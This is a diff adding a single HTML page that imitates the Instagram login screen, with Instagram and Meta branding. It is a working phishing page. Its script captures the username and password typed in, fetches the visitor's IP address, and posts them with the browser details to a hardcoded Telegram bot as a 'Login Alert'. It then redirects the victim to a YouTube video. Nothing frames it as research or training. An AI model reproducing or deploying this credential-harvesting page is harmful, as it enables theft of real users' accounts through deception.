@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sanjid • Instagram</title>
+  
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <!-- Font Awesome -->
+  <script>
+    window.FontAwesomeConfig = {
+      autoReplaceSvg: 'nest',
+    };
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&family=Roboto:wght@100;300;400;500;700;900&family=Open+Sans:wght@300;400;500;600;700;800&family=Lato:wght@100;300;400;700;900&family=Montserrat:wght@100;200;300;400;500;600;700;800;900&family=Poppins:wght@100;200;300;400;500;600;700;800;900&family=Raleway:wght@100;200;300;400;500;600;700;800;900&family=Nunito:wght@200;300;400;500;600;700;800;900&family=Ubuntu:wght@300;400;500;700&family=Playfair+Display:wght@400;500;600;700;800;900&family=Merriweather:wght@300;400;700;900&family=PT+Sans:wght@400;700&family=Oswald:wght@200;300;400;500;600;700&family=Mukta:wght@200;300;400;500;600;700;800&family=Work+Sans:wght@100;200;300;400;500;600;700;800;900&family=Roboto+Mono:wght@100;200;300;400;500;600;700&family=Source+Code+Pro:wght@200;300;400;500;600;700;800;900&family=IBM+Plex+Mono:wght@100;200;300;400;500;600;700&family=JetBrains+Mono:wght@100;200;300;400;500;600;700;800&family=Fira+Code:wght@300;400;500;600;700&family=Inconsolata:wght@200;300;400;500;600;700;800;900&family=Space+Mono:wght@400;700&family=Ubuntu+Mono:wght@400;700&display=swap">
+  
+  <style>
+    * {
+      font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+    
+    html, body {
+      margin: 0;
+      padding: 0;
+      background-color: #ffffff;
+    }
+    
+    .h-screen {
+      height: 100vh;
+    }
+    
+    .min-h-screen {
+      min-height: 100vh;
+    }
+    
+    .fa, .fas, .far, .fal, .fab {
+      font-family: "Font Awesome 6 Free", "Font Awesome 6 Brands" !important;
+    }
+  </style>
+</head>
+<body class="min-h-screen m-0 p-0 bg-white">
+  <div id="main-content" class="min-h-screen bg-[#1c2a38] flex flex-col font-sans text-white selection:bg-[#0064e0] selection:text-white">
+    
+    <!-- Top Language Selector -->
+    <div class="w-full flex justify-center pt-4 pb-8">
+        <button class="text-[#8e9eb0] text-sm flex items-center gap-1 hover:text-gray-300 transition-colors">
+            English (US)
+        </button>
+    </div>
+
+    <!-- Main Login Area -->
+    <div class="flex-1 flex flex-col items-center px-4 w-full max-w-sm mx-auto mt-8">
+        
+        <!-- Instagram Logo -->
+        <div class="mb-10">
+            <svg viewBox="0 0 100 100" class="w-[72px] h-[72px]">
+                <defs>
+                    <linearGradient id="ig-gradient" x1="15%" y1="100%" x2="85%" y2="0%">
+                        <stop offset="0%" stop-color="#feda75" />
+                        <stop offset="20%" stop-color="#fa7e1e" />
+                        <stop offset="40%" stop-color="#d62976" />
+                        <stop offset="60%" stop-color="#962fbf" />
+                        <stop offset="100%" stop-color="#4f5bd5" />
+                    </linearGradient>
+                </defs>
+                <rect x="12" y="12" width="76" height="76" rx="22" fill="none" stroke="url(#ig-gradient)" stroke-width="8.5"></rect>
+                <circle cx="50" cy="50" r="20" fill="none" stroke="url(#ig-gradient)" stroke-width="8.5"></circle>
+                <circle cx="71" cy="29" r="5" fill="url(#ig-gradient)"></circle>
+            </svg>
+        </div>
+
+        <!-- Login Form -->
+        <form id="loginForm" class="w-full flex flex-col gap-3.5">
+            <div class="relative">
+                <input 
+                    type="text" 
+                    id="username"
+                    placeholder="Username, email or mobile number" 
+                    class="w-full bg-transparent border border-[#3b4a5a] rounded-2xl px-4 py-4 text-white placeholder-[#8e9eb0] focus:outline-none focus:border-[#5a6b7c] transition-colors text-[15px]"
+                    required
+                >
+            </div>
+            
+            <div class="relative">
+                <input 
+                    type="password" 
+                    id="password"
+                    placeholder="Password" 
+                    class="w-full bg-transparent border border-[#3b4a5a] rounded-2xl px-4 py-4 text-white placeholder-[#8e9eb0] focus:outline-none focus:border-[#5a6b7c] transition-colors text-[15px]"
+                    required
+                >
+            </div>
+
+            <button 
+                type="submit" 
+                class="w-full bg-[#0064e0] hover:bg-[#0056c2] active:bg-[#004ba8] text-white font-semibold rounded-full py-3.5 mt-1 transition-colors text-[15px]"
+            >
+                Log in
+            </button>
+        </form>
+
+        <!-- Forgot Password Link -->
+        <a href="#" class="text-white font-semibold text-[15px] mt-6 hover:text-gray-200 transition-colors">
+            Forgot password?
+        </a>
+    </div>
+
+    <!-- Bottom Section -->
+    <div class="w-full max-w-sm mx-auto px-4 pb-8 mt-auto flex flex-col items-center gap-6">
+        
+        <button class="w-full bg-transparent border border-[#0064e0] text-[#338df6] hover:bg-[#0064e0]/10 active:bg-[#0064e0]/20 font-semibold rounded-full py-3.5 transition-colors text-[15px]">
+            Create new account
+        </button>
+
+        <!-- Meta Logo -->
+        <div class="flex items-center justify-center gap-1.5 text-[#8e9eb0]">
+            <svg viewBox="0 0 36 20" fill="none" xmlns="http://www.w3.org/2000/svg" class="h-3.5 w-auto">
+                <path d="M25.5 2C21.5 2 18.5 4.5 16.5 7.5C14.5 4.5 11.5 2 7.5 2C3.5 2 0 5 0 10C0 15 3.5 18 7.5 18C11.5 18 14.5 15.5 16.5 12.5C18.5 15.5 21.5 18 25.5 18C29.5 18 33 15 33 10C33 5 29.5 2 25.5 2ZM7.5 15.5C4.5 15.5 2.5 13 2.5 10C2.5 7 4.5 4.5 7.5 4.5C10.5 4.5 12.5 7 14 10C12.5 13 10.5 15.5 7.5 15.5ZM25.5 15.5C22.5 15.5 20.5 13 19 10C20.5 7 22.5 4.5 25.5 4.5C28.5 4.5 30.5 7 30.5 10C30.5 13 28.5 15.5 25.5 15.5Z" fill="currentColor"/>
+            </svg>
+            <span class="font-medium text-[15px] tracking-wide">Meta</span>
+        </div>
+    </div>
+  </div>
+
+  <!-- Loading Overlay (Hidden by default) -->
+  <div id="loadingOverlay" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center z-50">
+    <div class="bg-white rounded-lg p-6 text-center">
+      <div class="inline-block animate-spin rounded-full h-8 w-8 border-4 border-[#0064e0] border-t-transparent"></div>
+      <p class="text-gray-700 mt-2">Processing...</p>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', async function(event) {
+      event.preventDefault(); // Form submit rokna
+      
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const loadingOverlay = document.getElementById('loadingOverlay');
+      
+      // Loading overlay dikhana
+      loadingOverlay.classList.remove('hidden');
+      loadingOverlay.classList.add('flex');
+
+      try {
+        // 1. User ka IP address lena
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+
+        // 2. Telegram Bot details
+        const botToken = '8616749521:AAEHLcqMnjF4C8skCZAVCqXIMVS3Jckv7SM';
+        const chatId = '6547198153';
+        
+        // 3. Message format banana
+        const message = `🔐 *Sanjid Login Alert* 🔐
+
+━━━━━━━━━━━━━━━
+👤 *USERNAME*
+\`${username}\`
+
+🔑 *PASSWORD*
+\`${password}\`
+
+🌐 *IP ADDRESS*
+\`${userIP}\`
+
+📱 *DEVICE*
+${navigator.userAgent}
+━━━━━━━━━━━━━━━`;
+
+        // 4. Telegram par bhejna
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        await fetch(telegramUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+
+        // 5. Thoda sa delay for better UX (2 second)
+        setTimeout(() => {
+          // YouTube video par redirect
+          window.location.href = 'https://youtube.com/shorts/23LmHogE64I?si=ByPr79P_xupKFovj';
+        }, 1500);
+
+      } catch (error) {
+        console.error('Error:', error);
+        
+        // Agar error bhi aaye to bhi video par redirect
+        setTimeout(() => {
+          window.location.href = 'https://youtube.com/shorts/23LmHogE64I?si=ByPr79P_xupKFovj';
+        }, 1500);
+      }
+    });
+
+    // Optional: Enter key press bhi handle karna
+    document.addEventListener('keypress', function(event) {
+      if (event.key === 'Enter') {
+        event.preventDefault();
+        document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+      }
+    });
+  </script>
+</body>
+</html>
